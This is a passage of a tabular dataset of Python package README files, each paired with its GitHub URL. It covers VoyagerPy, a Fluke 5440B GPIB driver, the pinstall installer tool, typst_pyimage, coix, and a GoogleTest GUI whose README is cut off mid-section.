Some users may experince problems with installing GeoPandas, which VoyagerPy depends on. We refer to the [GeoPandas installation page](https://geopandas.org/en/stable/getting_started.html) if this is the case.

## Structure of VoyagerPy

VoyagerPy uses [AnnData](https://anndata.readthedocs.io/) as its internal datastructure. An AnnData object, `adata`, holds the following attributes:

- `adata.X`: the main data matrix of size $N_{obs} \times N_{vars}$. It holds the count data for each observation and feature (e.g. barcodes x genes), which may have gone under some transformation. Data type may be a `scipy.sparse.csr_matrix`, `numpy.ndarray`, or `numpy.matrix`. This is yet to be set in stone.
- `adata.layers`: A dictionary-like data structure with the values being matrices of the same shape as `adata.X`. These can hold transformations of `adata.X`, such as log-normalized counts.
- `adata.obs`: A `pandas.DataFrame` object where the rows represent the barcodes, and the columns are features of the barcodes.
- `adata.obsp`: This is a dictionary-based object, where each value is a `pandas.DataFrame` of size $N_{obs}\times N_{obs}$, representing a pairwise metric on the observation. For instance, `adata.obsp[""distances""]` can hold the pairwise distances between the positions of origin for the barcodes. This can be handy to store graphs over the barcodes.
- `adata.obsm`: This is a dictionary-based object where each value is a `pandas.DataFrame` or `geopandas.GeoDataFrame`. The number of rows in these data frames must be $N_{obs}$. Example of data frames to be stored here:
	- `geometry`: a `geopandas.GeoDataFrame` where each column is of `geopandas.GeoSeries` or `pandas.Series`, used for plotting spatial objects, such as points or polygons. To use GeoPandas for plotting a column, it must be a `geopandas.GeoSeries`. These will represent the geometries of the barcodes.
	- `local_*`: a `pandas.DataFrame` which contains spatial results over features in `obs`. These can be e.g. local Moran's I, local spatial heteroscedasticity (LOSH) over some features `x, y, z`. The columns of `local_moran` and `local_losh` would then be `x, y, z`.
- `adata.var`: A `pandas.DataFrame` object where the rows represent the features from the columns of `X` (e.g. genes), and the columns are features of the genes (or whatever the columns of `X` represent).
- `adata.varp`, `adata.varm`: These are not used for the time being, but these objects can be used similarly to `adata.obsp` and `adata.obsm` but for feature (gene) data.

- `adata.uns`: This is a dictionary containing data that cannot be stored in the above objects:
	- `config`: These can contain config or metadata about this object. By using VoyagerPy to read the scRNA-seq data, this dictionary has the following items by default:
		- `""var_names"": ""gene_ids""`, meaning that the index of the variables (genes) are the standardized ENSG gene IDs.
		- `""secondary_var_names"": ""symbol""`, meaning that the column `""symbol""` in `adata.var` contains the symbol names for the genes.
	- `spatial`: This dictionary contains various spatial data, including:
		- `img`: a dictionary with key-values as resolution-image
		- `scale`: a dictionary describing the scales of the images.
		- `transform`: metadata that describes the transforms applied to the images (rotation, mirror) such that the originals can be recovered.
		- `local_results`: This is a dictionary which can contain Monte-Carlo simulations of spatial autocorrelation statistics, such as for local Moran statistics.",pmelsted/voyagerpy
fluke5440b-async,https://github.com/PatrickBaus/pyAsyncFluke5440B,18,4278,4278,"[![pylint](https://github.com/PatrickBaus/pyAsyncFluke5440B/actions/workflows/pylint.yml/badge.svg)](https://github.com/PatrickBaus/pyAsyncHP3478A/actions/workflows/pylint.yml)
[![PyPI](https://img.shields.io/pypi/v/fluke5440b_async)](https://pypi.org/project/fluke5440b_async/)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/fluke5440b_async)
![PyPI - Status](https://img.shields.io/pypi/status/fluke5440b_async)
[![code style](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
# fluke5440b-async
Python3 AsyncIO Fluke 5440B driver. This library requires Python [asyncio](https://docs.python.org/3/library/asyncio.html) and AsyncIO library for the GPIB adapter.

The library is fully type-hinted.

> :warning: The following features are not supported (yet):
> - External calibration: I do not have the means to test this. If you want to help, open a ticket and we can get this done
> - Setting and retrieving DUUT tolerances and errors. I believe this is best done in software on the host computer and not done internally in the calibrator. If you really need that featuer open a ticket.

## Supported GPIB Hardware
|Device|Supported|Tested|Comments|
|--|--|--|--|
|[AsyncIO Prologix GPIB library](https://github.com/PatrickBaus/pyAsyncPrologixGpib)|:heavy_check_mark:|:heavy_check_mark:|  |
|[AsyncIO linux-gpib wrapper](https://github.com/PatrickBaus/pyAsyncGpib)|:heavy_check_mark:|:heavy_check_mark:|  |

Tested using Linux, but should work on Mac OSX, Windows or any OS with Python support.

## Documentation
The full documentation can be found on GitHub Pages:
[https://patrickbaus.github.io/pyAsyncFluke5440B/](https://patrickbaus.github.io/pyAsyncFluke5440B/). I use the
[Numpydoc](https://numpydoc.readthedocs.io/en/latest/format.html) style for documentation and
[Sphinx](https://www.sphinx-doc.org/en/master/index.html) for compiling it.

# Setup
To install the library in a virtual environment (always use venvs with every project):
```bash
python3 -m venv env  # virtual environment, optional
source env/bin/activate  # only if the virtual environment is used
pip install fluke5440b-async
```

All examples assume that a GPIB library is installed as well. Either run
```bash
pip install prologix-gpib-async    # or alternatively
# pip install async-gpib
```

# Usage
> :warning: The calibrator does not like excessive serial polling. So, when using the Prologix adapter, one might see warnings like this:
> *Got error during waiting: ErrorCode.GPIB_HANDSHAKE_ERROR. If you are using a Prologix adapter, this can be safely ignored at this point.*
> These are harmless and can be ignored.

The library uses an asynchronous context manager to make cleanup easier. You can use either the
context manager syntax or invoke the calls manually:

```python
async with Fluke_5440B(connection=gpib_device) as fluke5440b:
    # Add your code here
    ...
```

```python
try:
    fluke5440b = Fluke_5440B(connection=gpib_device)
    await fluke5440b.connect()
    # your code
finally:
    await fluke5440b.disconnect()
```


A simple example for setting the output voltage.
```python
from pyAsyncFluke5440B.Fluke_5440B import Fluke_5440B

from pyAsyncGpib.pyAsyncGpib.AsyncGpib import AsyncGpib


# This example will print voltage data to the console
async def main():
    # The default GPIB address is 7.
    async with Fluke_5440B(connection=AsyncGpib(name=0, pad=7)) as fluke5440b:
        # No need to explicitely bring up the GPIB connection. This will be done by the instrument.
        await fluke5440b.set_output(10.0)
        await fluke5440b.set_output_enabled(True)


try:
    asyncio.run(main(), debug=True)
except KeyboardInterrupt:
    # The loop will be canceled on a KeyboardInterrupt by the run() method, we just want to suppress the exception
    pass
```

See [examples/](examples/) for more working examples.

## Versioning

I use [SemVer](http://semver.org/) for versioning. For the versions available, see the [tags on this repository](https://github.com/PatrickBaus/pyAsyncPrologix/tags).

## Authors

* **Patrick Baus** - *Initial work* - [PatrickBaus](https://github.com/PatrickBaus)

## License


This project is licensed under the GPL v3 license - see the [LICENSE](LICENSE) file for details
","[![pylint](https://github.com/PatrickBaus/pyAsyncFluke5440B/actions/workflows/pylint.yml/badge.svg)](https://github.com/PatrickBaus/pyAsyncHP3478A/actions/workflows/pylint.yml)
[![PyPI](https://img.shields.io/pypi/v/fluke5440b_async)](https://pypi.org/project/fluke5440b_async/)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/fluke5440b_async)
![PyPI - Status](https://img.shields.io/pypi/status/fluke5440b_async)
[![code style](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
# fluke5440b-async
Python3 AsyncIO Fluke 5440B driver. This library requires Python [asyncio](https://docs.python.org/3/library/asyncio.html) and AsyncIO library for the GPIB adapter.

The library is fully type-hinted.

> :warning: The following features are not supported (yet):
> - External calibration: I do not have the means to test this. If you want to help, open a ticket and we can get this done
> - Setting and retrieving DUUT tolerances and errors. I believe this is best done in software on the host computer and not done internally in the calibrator. If you really need that featuer open a ticket.

## Supported GPIB Hardware
|Device|Supported|Tested|Comments|
|--|--|--|--|
|[AsyncIO Prologix GPIB library](https://github.com/PatrickBaus/pyAsyncPrologixGpib)|:heavy_check_mark:|:heavy_check_mark:|  |
|[AsyncIO linux-gpib wrapper](https://github.com/PatrickBaus/pyAsyncGpib)|:heavy_check_mark:|:heavy_check_mark:|  |

Tested using Linux, but should work on Mac OSX, Windows or any OS with Python support.

## Documentation
The full documentation can be found on GitHub Pages:
[https://patrickbaus.github.io/pyAsyncFluke5440B/](https://patrickbaus.github.io/pyAsyncFluke5440B/). I use the
[Numpydoc](https://numpydoc.readthedocs.io/en/latest/format.html) style for documentation and
[Sphinx](https://www.sphinx-doc.org/en/master/index.html) for compiling it.

# Setup
To install the library in a virtual environment (always use venvs with every project):
```bash
python3 -m venv env  # virtual environment, optional
source env/bin/activate  # only if the virtual environment is used
pip install fluke5440b-async
```

All examples assume that a GPIB library is installed as well. Either run
```bash
pip install prologix-gpib-async    # or alternatively
# pip install async-gpib
```

# Usage
> :warning: The calibrator does not like excessive serial polling. So, when using the Prologix adapter, one might see warnings like this:
> *Got error during waiting: ErrorCode.GPIB_HANDSHAKE_ERROR. If you are using a Prologix adapter, this can be safely ignored at this point.*
> These are harmless and can be ignored.

The library uses an asynchronous context manager to make cleanup easier. You can use either the
context manager syntax or invoke the calls manually:

```python
async with Fluke_5440B(connection=gpib_device) as fluke5440b:
    # Add your code here
    ...
```

```python
try:
    fluke5440b = Fluke_5440B(connection=gpib_device)
    await fluke5440b.connect()
    # your code
finally:
    await fluke5440b.disconnect()
```


A simple example for setting the output voltage.
```python
from pyAsyncFluke5440B.Fluke_5440B import Fluke_5440B

from pyAsyncGpib.pyAsyncGpib.AsyncGpib import AsyncGpib


# This example will print voltage data to the console
async def main():
    # The default GPIB address is 7.
    async with Fluke_5440B(connection=AsyncGpib(name=0, pad=7)) as fluke5440b:
        # No need to explicitely bring up the GPIB connection. This will be done by the instrument.
        await fluke5440b.set_output(10.0)
        await fluke5440b.set_output_enabled(True)


try:
    asyncio.run(main(), debug=True)
except KeyboardInterrupt:
    # The loop will be canceled on a KeyboardInterrupt by the run() method, we just want to suppress the exception
    pass
```

See [examples/](examples/) for more working examples.

## Versioning

I use [SemVer](http://semver.org/) for versioning. For the versions available, see the [tags on this repository](https://github.com/PatrickBaus/pyAsyncPrologix/tags).

## Authors

* **Patrick Baus** - *Initial work* - [PatrickBaus](https://github.com/PatrickBaus)

## License


This project is licensed under the GPL v3 license - see the [LICENSE](LICENSE) file for details
",patrickbaus/pyasyncfluke5440b
pinstall,https://github.com/bulletmark/pinstall,1,6629,6557,"## PINSTALL - Installer Tool for Python Programs
[![PyPi](https://img.shields.io/pypi/v/pinstall)](https://pypi.org/project/pinstall/)
[![AUR](https://img.shields.io/aur/version/pinstall)](https://aur.archlinux.org/packages/pinstall/)

This is a simple tool to facilitate installing Python programs on Linux
systems. The following commands are presently implemented, each as an
independent [plugin](pinstall/commands).

The latest documentation and code is available at
https://github.com/bulletmark/pinstall.

## Usage

Type `pinstall` or `pinstall -h` to view the usage summary:

```
usage: pinstall [-h] {venv,status,service} ...

Installer tool for Python programs.

options:
  -h, --help            show this help message and exit

Commands:
  {venv,status,service}
    venv                Creates a Python virtual environment.
    status              Reports systemctl status of services and timers
                        installed from the current directory.
    service             Installs systemd services and corresponding timers.
```

Type `pinstall <command> -h` to see specific help/usage for any
individual command:

### Command `venv`

```
usage: pinstall venv [-h] [-d DIR] [-p PYTHON | -P PYENV]
                        [-f REQUIREMENTS_FILE] [-r] [-u] [-w] [-v]
                        [args ...]

Creates a Python virtual environment.

Runs `python -m venv` (optionally for the specified Python name or path
or pyenv version) to create a venv; upgrades it with the latest pip +
setuptools + wheel; then installs all packages from requirements.txt if
present.

positional arguments:
  args                  optional arguments to python -m venv (add by starting
                        with ""--""). See options in `python -m venv -h`

options:
  -h, --help            show this help message and exit
  -d DIR, --dir DIR     directory name to create, default=""venv""
  -p PYTHON, --python PYTHON
                        python executable, default=""python3""
  -P PYENV, --pyenv PYENV
                        pyenv version to use, i.e. from `pyenv versions`.
  -f REQUIREMENTS_FILE, --requirements-file REQUIREMENTS_FILE
                        default=""requirements.txt""
  -r, --no-require      don't pip install packages from requirements.txt
  -u, --no-upgrade      don't upgrade pip/setuptools in venv
  -w, --no-wheel        don't install wheel in venv
  -v, --verbose         verbose pip install
```

### Command `status`

```
usage: pinstall status [-h] [-u] [units ...]

Reports systemctl status of services and timers installed from the
current directory.

positional arguments:
  units       systemd service file[s]

options:
  -h, --help  show this help message and exit
  -u, --user  report for user service
```

### Command `service`

```
usage: pinstall service [-h] [-u] [-s] [-e] [-r] [units ...]

Installs systemd services and corresponding timers.

Substitutes template strings within each *.service file in the current
directory (and in any corresponding .timer file); installs the
substituted file[s] to the appropriate systemd system (or user) unit
configuration directory; then enables and starts the service (or the
timer).

Template strings can be any of the following:

    HOME      : Home directory path of the invoking user
    USER      : User name of invoking user
    USERID    : Numeric user ID of the invoking user
    GROUPID   : Numeric group ID of the invoking user
    WORKDIR   : Directory path of the service file
    PROGDIR   : Same as WORKDIR
    BASENAME  : Directory name of the service file
    PROG      : Stem name of the service file (i.e. ""name"" in ""name.service"")
    PROGTITLE : Upper case of PROG

Template strings are specified in .service and .timer files by wrapping
them in hash symbols. Installed copies of these source files have all
instances of template strings replaced by their value. E.g. #HOME#
gets replaced by the user's home directory path.

positional arguments:
  units            systemd service file[s]

options:
  -h, --help       show this help message and exit
  -u, --user       install as user service
  -s, --no-start   do not start service[s]
  -e, --no-enable  do not enable service[s]
  -r, --remove     just uninstall and remove service[s]
```

## Command `venv` usage with Pyenv

[Pyenv](https://github.com/pyenv/pyenv) is a popular tool to easily
install and switch between multiple versions of Python. So for example,
you can use `pyenv` + `pinstall` to easily test a Python program with an
older or newer version than your system Python.

E.g. Install Python 3.7 and then create a virtual enviroment (in the
current directory) using it:

```sh
$ pyenv install 3.7
$ pinstall venv -P 3.7
$ venv/bin/python --version
Python 3.7.16
```

Note in this example that [pyenv](https://github.com/pyenv/pyenv)
installed Python 3.7.16 because that was the latest 3.7 version
available (at the time of writing).

## Installation

Arch Linux users can install [pinstall from the
AUR](https://aur.archlinux.org/packages/pinstall).

Python 3.6 or later is required and the [`sudo`](https://www.sudo.ws/)
program must be installed.

Note [pinstall is on PyPI](https://pypi.org/project/pinstall/) so just
ensure that `python3-pip` and `python3-wheel` are installed then type
the following to install (or upgrade):

```
$ sudo pip3 install -U --use-pep517 --root-user-action=ignore pinstall
```

Note you can not install as user (i.e. `pip3 install --user`) because
`pyinstall` uses `sudo` to invoke itself to install to system
directories.

Alternately, do the following to install from the source repository
rather than directly from PiPI:

```sh
$ git clone http://github.com/bulletmark/pinstall
$ cd pinstall
$ sudo pip3 install -U --use-pep517 --root-user-action=ignore .
```

## Upgrade

```sh
$ cd pinstall  # Source dir, as above
$ git pull
$ sudo pip3 install -U --use-pep517 --root-user-action=ignore .
```

## Removal

```sh
$ sudo pip3 uninstall --root-user-action=ignore pinstall
```

## License

Copyright (C) 2023 Mark Blakeney. This program is distributed under the
terms of the GNU General Public License. This program is free software:
you can redistribute it and/or modify it under the terms of the GNU
General Public License as published by the Free Software Foundation,
either version 3 of the License, or any later version. This program is
distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or
FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License at
<http://www.gnu.org/licenses/> for more details.

<!-- vim: se ai syn=markdown: -->
","## PINSTALL - Installer Tool for Python Programs
[![PyPi](https://img.shields.io/pypi/v/pinstall)](https://pypi.org/project/pinstall/)
[![AUR](https://img.shields.io/aur/version/pinstall)](https://aur.archlinux.org/packages/pinstall/)

This is a simple tool to facilitate installing Python programs on Linux
systems. The following commands are presently implemented, each as an
independent [plugin](pinstall/commands).

The latest documentation and code is available at
https://github.com/bulletmark/pinstall.

## Usage

Type `pinstall` or `pinstall -h` to view the usage summary:

```
usage: pinstall [-h] {venv,status,service} ...

Installer tool for Python programs.

options:
  -h, --help            show this help message and exit

Commands:
  {venv,status,service}
    venv                Creates a Python virtual environment.
    status              Reports systemctl status of services and timers
                        installed from the current directory.
    service             Installs systemd services and corresponding timers.
```

Type `pinstall  -h` to see specific help/usage for any
individual command:

### Command `venv`

```
usage: pinstall venv [-h] [-d DIR] [-p PYTHON | -P PYENV]
                        [-f REQUIREMENTS_FILE] [-r] [-u] [-w] [-v]
                        [args ...]

Creates a Python virtual environment.

Runs `python -m venv` (optionally for the specified Python name or path
or pyenv version) to create a venv; upgrades it with the latest pip +
setuptools + wheel; then installs all packages from requirements.txt if
present.

positional arguments:
  args                  optional arguments to python -m venv (add by starting
                        with ""--""). See options in `python -m venv -h`

options:
  -h, --help            show this help message and exit
  -d DIR, --dir DIR     directory name to create, default=""venv""
  -p PYTHON, --python PYTHON
                        python executable, default=""python3""
  -P PYENV, --pyenv PYENV
                        pyenv version to use, i.e. from `pyenv versions`.
  -f REQUIREMENTS_FILE, --requirements-file REQUIREMENTS_FILE
                        default=""requirements.txt""
  -r, --no-require      don't pip install packages from requirements.txt
  -u, --no-upgrade      don't upgrade pip/setuptools in venv
  -w, --no-wheel        don't install wheel in venv
  -v, --verbose         verbose pip install
```

### Command `status`

```
usage: pinstall status [-h] [-u] [units ...]

Reports systemctl status of services and timers installed from the
current directory.

positional arguments:
  units       systemd service file[s]

options:
  -h, --help  show this help message and exit
  -u, --user  report for user service
```

### Command `service`

```
usage: pinstall service [-h] [-u] [-s] [-e] [-r] [units ...]

Installs systemd services and corresponding timers.

Substitutes template strings within each *.service file in the current
directory (and in any corresponding .timer file); installs the
substituted file[s] to the appropriate systemd system (or user) unit
configuration directory; then enables and starts the service (or the
timer).

Template strings can be any of the following:

    HOME      : Home directory path of the invoking user
    USER      : User name of invoking user
    USERID    : Numeric user ID of the invoking user
    GROUPID   : Numeric group ID of the invoking user
    WORKDIR   : Directory path of the service file
    PROGDIR   : Same as WORKDIR
    BASENAME  : Directory name of the service file
    PROG      : Stem name of the service file (i.e. ""name"" in ""name.service"")
    PROGTITLE : Upper case of PROG

Template strings are specified in .service and .timer files by wrapping
them in hash symbols. Installed copies of these source files have all
instances of template strings replaced by their value. E.g. #HOME#
gets replaced by the user's home directory path.

positional arguments:
  units            systemd service file[s]

options:
  -h, --help       show this help message and exit
  -u, --user       install as user service
  -s, --no-start   do not start service[s]
  -e, --no-enable  do not enable service[s]
  -r, --remove     just uninstall and remove service[s]
```

## Command `venv` usage with Pyenv

[Pyenv](https://github.com/pyenv/pyenv) is a popular tool to easily
install and switch between multiple versions of Python. So for example,
you can use `pyenv` + `pinstall` to easily test a Python program with an
older or newer version than your system Python.

E.g. Install Python 3.7 and then create a virtual enviroment (in the
current directory) using it:

```sh
$ pyenv install 3.7
$ pinstall venv -P 3.7
$ venv/bin/python --version
Python 3.7.16
```

Note in this example that [pyenv](https://github.com/pyenv/pyenv)
installed Python 3.7.16 because that was the latest 3.7 version
available (at the time of writing).

## Installation

Arch Linux users can install [pinstall from the
AUR](https://aur.archlinux.org/packages/pinstall).

Python 3.6 or later is required and the [`sudo`](https://www.sudo.ws/)
program must be installed.

Note [pinstall is on PyPI](https://pypi.org/project/pinstall/) so just
ensure that `python3-pip` and `python3-wheel` are installed then type
the following to install (or upgrade):

```
$ sudo pip3 install -U --use-pep517 --root-user-action=ignore pinstall
```

Note you can not install as user (i.e. `pip3 install --user`) because
`pyinstall` uses `sudo` to invoke itself to install to system
directories.

Alternately, do the following to install from the source repository
rather than directly from PiPI:

```sh
$ git clone http://github.com/bulletmark/pinstall
$ cd pinstall
$ sudo pip3 install -U --use-pep517 --root-user-action=ignore .
```

## Upgrade

```sh
$ cd pinstall  # Source dir, as above
$ git pull
$ sudo pip3 install -U --use-pep517 --root-user-action=ignore .
```

## Removal

```sh
$ sudo pip3 uninstall --root-user-action=ignore pinstall
```

## License

Copyright (C) 2023 Mark Blakeney. This program is distributed under the
terms of the GNU General Public License. This program is free software:
you can redistribute it and/or modify it under the terms of the GNU
General Public License as published by the Free Software Foundation,
either version 3 of the License, or any later version. This program is
distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or
FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License at
 for more details.


",bulletmark/pinstall
typst-pyimage,https://github.com/patrick-kidger/typst_pyimage,1,2706,2551,"<h1 align=""center"">typst_pyimage</h1>

<p align=""center"">Wraps <a href=""https://github.com/typst/typst"">Typst</a> to support inline Python code for generating figures.</p>

## Example

<img align=""right"" width=""45%"" src=""./imgs/lotka_volterra.png"">

```typst
#import "".typst_pyimage/pyimage.typ"": pyimage

Consider the Lotka--Volterra (predator-prey)
equations:

#pyimage(""
import diffrax
import jax.numpy as jnp
import matplotlib.pyplot as plt

def func(t, y, args):
  rabbits, cats = y
  d_rabbits = rabbits - rabbits*cats
  d_cats = -cats + rabbits*cats
  return d_rabbits, d_cats

term = diffrax.ODETerm(func)
solver = diffrax.Tsit5()
y0 = (2, 1)
t0 = 0
t1 = 20
dt0 = 0.01
ts = jnp.linspace(t0, t1, 100)
saveat = diffrax.SaveAt(ts=ts)
sol = diffrax.diffeqsolve(term, solver, t0,
                          t1, dt0, y0,
                          saveat=saveat)

plt.plot(ts, sol.ys[0], label='Rabbits')
plt.plot(ts, sol.ys[1], label='Cats')
plt.xlim(0, 20)
plt.ylim(0, 2.5)
plt.xlabel('Time')
plt.ylabel('Population')
plt.legend()
"", width: 70%)
```

_(This example uses [JAX](https://github.com/google/jax) and [Diffrax](https://github.com/patrick-kidger/diffrax) to solve an ODE.)_

## Installation

```
pip install typst_pyimage
```

This requires that you're using Typst locally -- it won't work with the web app.

## Usage

1. Import `pyimage.typ`. At the start of your `.typ` file, add the line `#import "".typst_pyimage/pyimage.typ"": pyimage`.

2. Use the `pyimage` function. This has syntax `pyimage(string, ..arguments) -> content`. The positional string should be a Python program that creates a single matplotlib figure. Any named arguments are forward on to Typst's built-in `image` function. You can use it just like the normal `image` function, e.g. `#align(center, pyimage(""...""))`.

3. Compile or watch. Run either of the following two commands:
    ```
    python -m typst_pyimage compile your_file.typ
    python -m typst_pyimage watch your_file.typ
    ```
    This will extract and run all your Python code. In addition it will call either `typst compile your_file.typ` or `typst watch your_file.typ`.

    The resulting images are saved in the `.typst_pyimage` folder.

## Limitations

1. The watcher just extracts all the `pyimage(""..."")` blocks via regex, and runs them in the order that they appear in the file. This means that (a) the `""` character may not appear anywhere in the Python code (even if escaped), and (b) trying to call `pyimage` dynamically (i.e. not with a literal string at the top level of your program) will not work.
2. Only `pyimage(""..."")` calls inside the single watched file are tracked.

We could probably lift 1a and 2 with a bit of effort. PRs welcome.
","typst_pyimage
Wraps Typst to support inline Python code for generating figures.

## Example



```typst
#import "".typst_pyimage/pyimage.typ"": pyimage

Consider the Lotka--Volterra (predator-prey)
equations:

#pyimage(""
import diffrax
import jax.numpy as jnp
import matplotlib.pyplot as plt

def func(t, y, args):
  rabbits, cats = y
  d_rabbits = rabbits - rabbits*cats
  d_cats = -cats + rabbits*cats
  return d_rabbits, d_cats

term = diffrax.ODETerm(func)
solver = diffrax.Tsit5()
y0 = (2, 1)
t0 = 0
t1 = 20
dt0 = 0.01
ts = jnp.linspace(t0, t1, 100)
saveat = diffrax.SaveAt(ts=ts)
sol = diffrax.diffeqsolve(term, solver, t0,
                          t1, dt0, y0,
                          saveat=saveat)

plt.plot(ts, sol.ys[0], label='Rabbits')
plt.plot(ts, sol.ys[1], label='Cats')
plt.xlim(0, 20)
plt.ylim(0, 2.5)
plt.xlabel('Time')
plt.ylabel('Population')
plt.legend()
"", width: 70%)
```

_(This example uses [JAX](https://github.com/google/jax) and [Diffrax](https://github.com/patrick-kidger/diffrax) to solve an ODE.)_

## Installation

```
pip install typst_pyimage
```

This requires that you're using Typst locally -- it won't work with the web app.

## Usage

1. Import `pyimage.typ`. At the start of your `.typ` file, add the line `#import "".typst_pyimage/pyimage.typ"": pyimage`.

2. Use the `pyimage` function. This has syntax `pyimage(string, ..arguments) -> content`. The positional string should be a Python program that creates a single matplotlib figure. Any named arguments are forward on to Typst's built-in `image` function. You can use it just like the normal `image` function, e.g. `#align(center, pyimage(""...""))`.

3. Compile or watch. Run either of the following two commands:
    ```
    python -m typst_pyimage compile your_file.typ
    python -m typst_pyimage watch your_file.typ
    ```
    This will extract and run all your Python code. In addition it will call either `typst compile your_file.typ` or `typst watch your_file.typ`.

    The resulting images are saved in the `.typst_pyimage` folder.

## Limitations

1. The watcher just extracts all the `pyimage(""..."")` blocks via regex, and runs them in the order that they appear in the file. This means that (a) the `""` character may not appear anywhere in the Python code (even if escaped), and (b) trying to call `pyimage` dynamically (i.e. not with a literal string at the top level of your program) will not work.
2. Only `pyimage(""..."")` calls inside the single watched file are tracked.

We could probably lift 1a and 2 with a bit of effort. PRs welcome.
",patrick-kidger/typst_pyimage
ovos-classifiers,https://github.com/OpenVoiceOS/ovos-classifiers,4,0,0,,,openvoiceos/ovos-classifiers
coix,https://github.com/jax-ml/coix,9,477,477,"# coix

[![Unittests](https://github.com/jax-ml/coix/actions/workflows/pytest_and_autopublish.yml/badge.svg)](https://github.com/jax-ml/coix/actions/workflows/pytest_and_autopublish.yml)
[![PyPI version](https://badge.fury.io/py/coix.svg)](https://badge.fury.io/py/coix)

Inference Combinators in JAX (Coix) is a machine learning framework used to
develop inference algorithms that are composed of probabilistic programs.

*This is not an officially supported Google product.*
","# coix

[![Unittests](https://github.com/jax-ml/coix/actions/workflows/pytest_and_autopublish.yml/badge.svg)](https://github.com/jax-ml/coix/actions/workflows/pytest_and_autopublish.yml)
[![PyPI version](https://badge.fury.io/py/coix.svg)](https://badge.fury.io/py/coix)

Inference Combinators in JAX (Coix) is a machine learning framework used to
develop inference algorithms that are composed of probabilistic programs.

*This is not an officially supported Google product.*
",jax-ml/coix
mote-gtest-gui,https://github.com/tomzox/gtest_gui,0,27615,27615,"Module-Tester's Gtest GUI
=========================

Description
-----------

**Module-tester's GtestGui** is a full-featured graphical user-interface to C++ test applications using the GoogleTest framework.

The tool will work with any application with Gtest command line interface, however it is designed especially for C++ developers using test-driven design based on module testing and integration testing. These differ from unit-testing by longer execution times and usually not fully predictable results, which in turn require multiple repetitions of each test case. To support this well, GtestGui offers firstly easily accessible ways for test case filtering and concurrent scheduling across multiple CPUs; Secondly, there are multiple features for tracking progress and managing results via sorting and filtering, which are fully usable already while a test campaign still is in progress.

GtestGui typically is started with the path of an executable on the command line which is built using the gtest library. Using the ""Run"" button in the GUI, this executable can then be started and its progress be monitored live in the result log frame of the main window. Additional controls allow specifying options such as test case filter string and repetition count, which are forwarded to the executable via the respective ""\ ``--gtest_*``"" command line arguments.

While tests are running, test verdicts can be monitored live in the result log. Traces of passed or failed tests can already be analyzed simply by double-clicking on an entry in the result log, which will open the trace of that particular test case run. For this purpose GtestGui comes bundled with *Trowser*, which is a graphical browser for large line-oriented text files. Trowser in principle is just a text browser with syntax highlighting and search, but its search capabilities are designed especially to facilitate analysis of complex debug logs, essentially by allowing to build a condensed (filtered) view of the trace file in the search result window via incremental searches and manual manipulations. By default, GtestGui is configured to user *trowser.py*, but there is also a more modern-looking Qt5 variant. GtestGui can also be configured to use any other GUI application for opening traces.

Test control
------------

The application main window consists of a menu bar, a frame containing test controls, a frame containing the test result log, and a text frame for trace preview. This chapter describes the top-most frame with the test controls.

Test campaign control buttons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Most prominent in the test control frame are the green buttons, which directly control execution of the configured executable file:

*Run*:
  Starts the text executable in a separate process, with its output redirected into a pipe which is read by GtestGui for progress monitoring. The output is also saved into a file.

  Note when the timestamp of the executable file on disk has changed, GtestGui automatically reads the test case list to check for changes. An error will be reported if the current test case filter contains pattern that no longer match any test case. Note after adding a new test case, use the *Refresh test case list* command in the *Control* menu to read the test case list, for allowing to use the new test case name in a filter pattern.

  Multiple processes are started if the *CPUs* value is larger than 1. Most of the time, GtestGui will use gtest's ""sharding"" feature, which assigns a static sub-set of tests to each process. However, if repetition count is larger than one and the number of configured CPUs is larger than the number of test cases, or if the remainder of division of test cases by CPUs is large, GtestGui may instead or additionally partition by repetitions.

  Note when a test process crashes, it is currently not restarted. That is because gtest's static sharding does not allow disabling the instable test case without influencing test case partitioning.

*Stop*:
  Sends a TERM signal to the test processes and waits for them to finish. When termination takes a long time (possibly because the executable is hung) and the button is clicked a second time, a KILL signal is sent.

*Resume*:
  Restarts test case execution using the same test case filter setting and executable version as previously used, without resetting the test result statistics. Other options, such as repetition or CPU count may be modified. This operation is useful when a long test run has to be paused temporarily as the CPUs are needed otherwise, or for changing options such as the number of used CPUs.

  This command will also use the same version of the test executable as used previously if option *Create copy of executable file* is enabled, see `Configuration`_. This allows resuming execution even when the executable at the configured path no longer exists, for example due to a failed build.

  When resuming, scheduling cannot restart exactly where it was stopped due to limitations in gtest. If repetition count is 1, all test cases will be rescheduled. For higher repetition count, the lowest number of remaining repetitions across all selected test cases is rescheduled.

*Repeat*:
  Repeats the test cases marked manually for repetition via the result log, or all previously failed test cases if none were selected. This allows quick repetition of individual test cases without changing the test case filter.

Test case filter
~~~~~~~~~~~~~~~~

The entry field at the top of the test control frame allows specifying a test case filter, so that only a matching sub-set of test cases is run. The filter can be entered manually using the same syntax as the ""\ ``--gtest-filter``"" command line option: The format of a filter expression is a "":""-separated list of test case names of wildcard patterns (positive patterns), optionally followed by a ""-"" and another "":""-separated pattern list (negative patterns). A test matches the filter if and only if it matches any of the positive patterns, but none of the negative ones. Wildcard characters are ""*"" (matching any sub-string) and ""?"" (matching any single character). As a special case, when no positive pattern is specified, all test cases are considered matching.

Alternatively, the test case filter can be modified via the drop-down menu below the entry field (which can be opened by the Cursor-Down key or a click on the drop-down button next to the entry field). The menu has entries for selecting and deselecting entries test suites as well as individual test cases. When modifying the filter this way, GtestGui will update the entry field with the shortest filter expression it can find using trailing wild card and negative patterns.

Yet another alternative for modifying test case filters is the test case list dialog, either via its context menu or the ""Return"" and ""Delete"" key bindings. Finally note any modification to the test case filter can be undone using ""Control-Z"" key binding in the entry field, or redone using ""Control-Y"" key binding.

Test control options
~~~~~~~~~~~~~~~~~~~~

*Repetitions*:
  If a value larger than 1 is entered here, it is passed via the ""\ ``--gtest_repeat=NNN``"" option on the executable's command line. This causes each test case to be repeated the given number of times.

*CPUs*:
  This option is described in `Test campaign control buttons`_.

*Ignore filter*:
